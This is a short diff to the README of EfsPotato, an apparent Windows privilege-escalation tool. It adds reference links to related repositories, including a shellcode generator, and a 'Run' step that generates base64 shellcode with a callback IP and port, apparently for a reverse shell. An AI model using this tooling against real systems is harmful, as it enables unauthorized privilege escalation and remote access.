@@ -1,5 +1,15 @@
 # EfsPotato
 
+## Reference
+
+https://github.com/0neAtSec/EfsPotato-1
+
+https://github.com/zcgonvh/EfsPotato
+
+https://github.com/senzee1984/micr0_shell
+
+## Run
+
 1. Generate shellcode
 
 `python genshellcode.py --ip 192.168.100.152 --port 20000 --language base64`
